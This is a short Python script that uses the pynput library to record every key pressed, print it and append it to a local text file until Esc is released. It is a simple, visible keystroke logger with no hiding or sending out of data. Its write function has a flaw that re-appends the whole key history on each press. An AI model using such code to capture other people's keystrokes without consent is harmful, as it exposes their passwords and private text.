from pynput.keyboard import Key, Listener

k = []  # for storing the data of the pressed keys


# 3 function is used
# def on_press()---whatever keys will be pressed
# def write_1()---for storing the data
# def on_release()---keys which is released

def on_press(key):
    k.append(key)
    write_1(k)
    print(str(key))


def write_1(var):
    with open("demo.txt", "a") as f:
        for i in var:
            new_var = str(i).replace("'", '')
            f.write(new_var)
            f.write(" ")
            f.write(" ")


def on_release(key):
    if key == Key.esc:
        return False


# for recording the pressed keys and released keys
with Listener(on_press=on_press, on_release=on_release) as l:
    l.join()
